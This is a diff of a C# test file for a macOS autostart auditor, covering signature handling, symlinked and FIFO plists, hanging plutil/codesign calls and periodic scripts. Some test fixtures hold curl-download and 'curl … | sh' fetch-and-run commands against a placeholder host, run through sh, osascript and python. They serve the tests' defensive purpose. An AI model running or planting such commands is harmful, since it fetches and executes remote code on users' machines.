@@ -53,6 +53,11 @@ public sealed class AutostartTests
 
         public HashSet<string> Unreadable { get; } = [];
 
+        /// <summary>Paths plutil or codesign never finishes on, and programs that hang outright.</summary>
+        public HashSet<string> Hangs { get; } = [];
+
+        public Dictionary<string, string> Links { get; } = [];
+
         public string[] Homes { get; set; } = [];
 
         public ExternalResult SystemExtensions { get; set; } = FakeCommands.Ok("0 extension(s)\n");
@@ -75,12 +80,13 @@ public sealed class AutostartTests
                 ListEntries = directory => all.Where(p => p.StartsWith(directory + "/", StringComparison.Ordinal) && !p[(directory.Length + 1)..].Contains('/')),
                 FileExists = path => all.Contains(path),
                 ReadText = path => Unreadable.Contains(path) ? throw new UnauthorizedAccessException(path) : Texts.GetValueOrDefault(path),
-                Resolve = path => path,
+                Resolve = path => Links.TryGetValue(path, out var target) ? target : path,
             };
         }
 
         private ExternalResult Answer(string program, IReadOnlyList<string> args) => (program, args.FirstOrDefault()) switch
         {
+            _ when Hangs.Contains(program) || (program is "plutil" or "codesign" && Hangs.Contains(args[^1])) => FakeCommands.Hang(program),
             ("plutil", "-convert") when Unreadable.Contains(args[^1]) => new ExternalResult(1, "", $"{args[^1]}: Permission denied"),
             ("plutil", "-convert") => Plists.TryGetValue(args[^1], out var xml) ? FakeCommands.Ok(xml) : new ExternalResult(1, "", "no such file"),
             ("stat", _) => StatLinesTests.Answer(Stats, args),
@@ -143,19 +149,166 @@ public sealed class AutostartTests
     }
 
     [Fact]
-    public async Task With_signatures_checked_a_program_apple_signed_is_hidden_and_a_third_party_one_kept()
+    public async Task An_apple_signed_program_run_from_a_plist_outside_the_sealed_volume_is_still_shown()
     {
+        // Apple's programs can be pointed at anything (curl, osascript, launchctl): the program's signer says
+        // nothing about who configured the job, so only the sealed volume hides an entry.
         var mac = new FakeMac();
         const string AppleTool = "/Library/LaunchDaemons/com.apple.thing.plist";
-        mac.Plists[AppleTool] = Plist("com.apple.thing", ["/usr/libexec/thing"]);
+        mac.Plists[AppleTool] = Plist("com.apple.thing", ["/usr/bin/curl", "-o", "/tmp/x", "https://example.invalid/x"]);
         mac.Stats[AppleTool] = Line(AppleTool, 0, 0, "0644", "Regular File");
-        mac.Stats["/usr/libexec/thing"] = Line("/usr/libexec/thing", 0, 0, "0755", "Regular File");
-        mac.AppleSigned.Add("/usr/libexec/thing");
+        mac.Stats["/usr/bin/curl"] = Line("/usr/bin/curl", 0, 0, "0755", "Regular File");
+        mac.AppleSigned.Add("/usr/bin/curl");
 
         var result = await Audit(mac, new AutostartQuery(VerifySignatures: true));
 
-        Assert.Equal(["com.example.agentd"], result.Entries.Select(e => e.Entry));
-        Assert.True(result.Entries[0].Signed);
+        var entry = result.Entries.Single(e => e.Entry == "com.apple.thing");
+        Assert.Equal((true, "Signed by Apple"), (entry.Signed, entry.SignatureDetail));
+    }
+
+    [Theory]
+    [InlineData("/bin/sh", "-c")]
+    [InlineData("/usr/bin/osascript", "-e")]
+    [InlineData("/usr/bin/python3", "-c")]
+    [InlineData("/usr/bin/env", "python3")]
+    public async Task An_interpreter_running_inline_code_counts_as_unsigned_whatever_signed_the_interpreter(string interpreter, string flag)
+    {
+        var mac = new FakeMac();
+        const string Inline = "/Library/LaunchDaemons/com.example.inline.plist";
+        mac.Plists[Inline] = Plist("com.example.inline", [interpreter, flag, "curl https://example.invalid | sh"]);
+        mac.Stats[Inline] = Line(Inline, 0, 0, "0644", "Regular File");
+        mac.Stats[interpreter] = Line(interpreter, 0, 0, "0755", "Regular File");
+        mac.AppleSigned.Add(interpreter);
+
+        var result = await Audit(mac, new AutostartQuery(UnsignedOnly: true));
+
+        var entry = result.Entries.Single(e => e.Entry == "com.example.inline");
+        Assert.False(entry.Signed);
+        Assert.Contains("interpreter", entry.SignatureDetail, StringComparison.Ordinal);
+    }
+
+    [Fact]
+    public async Task A_plist_that_is_not_a_regular_file_is_never_handed_to_plutil_and_is_flagged()
+    {
+        var mac = new FakeMac { Homes = ["/Users/alice"] };
+        const string Fifo = "/Users/alice/Library/LaunchAgents/x.plist";
+        mac.Plists[Fifo] = Plist("x", ["/bin/true"]);
+        mac.Stats["/Users/alice"] = Line("/Users/alice", 501, 20, "0750", "Directory");
+        mac.Stats[Fifo] = Line(Fifo, 501, 20, "0644", "Fifo File");
+
+        var result = await Audit(mac, new AutostartQuery("useragents"));
+
+        Assert.DoesNotContain(mac.Commands.Calls, c => c.Program == "plutil" && c.Arguments.Contains(Fifo));
+        var entry = result.Entries.Single(e => e.Location == Fifo);
+        Assert.True(entry.WritableByOthers);
+        Assert.Contains(entry.Findings, f => f.Contains("not a regular file", StringComparison.Ordinal));
+    }
+
+    [Fact]
+    public async Task A_plist_linked_to_a_device_is_never_handed_to_plutil()
+    {
+        var mac = new FakeMac();
+        const string Linked = "/Library/LaunchDaemons/com.example.zero.plist";
+        mac.Plists[Linked] = Plist("com.example.zero", ["/bin/true"]);
+        mac.Stats[Linked] = Line(Linked, 0, 0, "0755", "Symbolic Link");
+        mac.Stats["/dev/zero"] = Line("/dev/zero", 0, 0, "0666", "Character Device");
+        mac.Links[Linked] = "/dev/zero";
+
+        var result = await Audit(mac);
+
+        Assert.DoesNotContain(mac.Commands.Calls, c => c.Program == "plutil" && (c.Arguments.Contains(Linked) || c.Arguments.Contains("/dev/zero")));
+        Assert.Contains(result.Entries, e => e.Location == Linked && e.WritableByOthers);
+    }
+
+    [Fact]
+    public async Task A_plist_linked_to_a_regular_file_is_read_where_it_leads()
+    {
+        var mac = new FakeMac();
+        const string Linked = "/Library/LaunchDaemons/com.example.linked.plist";
+        const string Target = "/Library/Example/com.example.linked.plist";
+        mac.Plists[Target] = Plist("com.example.linked", [AgentDProgram]);
+        mac.Stats[Linked] = Line(Linked, 0, 0, "0755", "Symbolic Link");
+        mac.Stats[Target] = Line(Target, 0, 0, "0644", "Regular File");
+        mac.Directories.Add(Linked);
+        mac.Links[Linked] = Target;
+
+        var result = await Audit(mac);
+
+        Assert.Contains(result.Entries, e => e.Entry == "com.example.linked" && e.Location == Linked);
+    }
+
+    [Fact]
+    public async Task A_plist_plutil_never_finishes_on_is_unreadable_and_the_audit_still_returns()
+    {
+        var mac = new FakeMac();
+        mac.Hangs.Add(AgentD);
+
+        var result = await Audit(mac);
+
+        Assert.Empty(result.Entries);
+        Assert.Contains(result.Limitations, l => l.Contains("plutil did not finish", StringComparison.Ordinal));
+    }
+
+    [Fact]
+    public async Task A_program_codesign_never_finishes_on_is_reported_as_not_judged_and_kept_by_unsigned_only()
+    {
+        var mac = new FakeMac();
+        mac.Hangs.Add(AgentDProgram);
+
+        var entry = (await Audit(mac, new AutostartQuery(UnsignedOnly: true))).Entries.Single();
+
+        Assert.Null(entry.Signed);
+        Assert.Contains("did not finish", entry.SignatureDetail, StringComparison.Ordinal);
+    }
+
+    [Fact]
+    public async Task A_listing_command_that_hangs_is_a_named_limitation_not_a_failed_audit()
+    {
+        var mac = new FakeMac();
+        mac.Hangs.Add("kmutil");
+
+        var result = await Audit(mac, new AutostartQuery("daemons,kext"));
+
+        Assert.Single(result.Entries);
+        Assert.Contains(result.Limitations, l => l.Contains("kmutil showloaded", StringComparison.Ordinal));
+    }
+
+    [Fact]
+    public async Task A_symlinked_periodic_script_is_judged_where_it_leads_because_periodic_runs_it()
+    {
+        var mac = new FakeMac();
+        const string Script = "/usr/local/etc/periodic/daily/600.sync";
+        const string Target = "/usr/local/Cellar/sync/bin/sync.sh";
+        mac.Stats[Script] = Line(Script, 501, 20, "0755", "Symbolic Link");
+        mac.Stats[Target] = Line(Target, 501, 20, "0755", "Regular File");
+        mac.Links[Script] = Target;
+
+        var entry = (await Audit(mac, new AutostartQuery("periodic"))).Entries.Single();
+
+        Assert.Equal("600.sync", entry.Entry);
+        Assert.True(entry.WritableByOthers);
+    }
+
+    [Fact]
+    public async Task A_periodic_script_whose_name_has_a_control_character_is_flagged_not_dropped()
+    {
+        var mac = new FakeMac();
+        mac.Directories.Add("/etc/periodic/daily/x\ny");
+
+        var entry = (await Audit(mac, new AutostartQuery("periodic"))).Entries.Single();
+
+        Assert.True(entry.WritableByOthers);
+        Assert.Contains(entry.Findings, f => f.Contains("control character", StringComparison.Ordinal));
+    }
+
+    [Fact]
+    public async Task Without_root_other_users_launch_agents_are_named_as_possibly_missing()
+    {
+        var mac = new FakeMac { Root = false, Homes = ["/Users/alice"] };
+
+        var result = await Audit(mac, new AutostartQuery("useragents"));
+
+        Assert.Contains(result.Limitations, l => l.Contains("LaunchAgents", StringComparison.Ordinal));
     }
 
     [Fact]
